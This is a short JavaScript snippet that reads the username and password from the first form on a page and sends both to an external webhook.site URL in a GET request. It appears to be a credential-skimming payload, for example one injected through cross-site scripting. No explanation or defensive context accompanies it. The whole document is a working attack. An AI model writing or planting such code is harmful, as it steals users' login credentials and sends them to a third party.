
var username = document.forms[0].elements[0].value;
var password = document.forms[0].elements[1].value;

var request = new XMLHttpRequest();

request.open("GET", "https://webhook.site/23a853f5-6b6f-4882-b828-8e65e5edbc10/username=" +username+ "&passoword=" + password, true);

request.send();
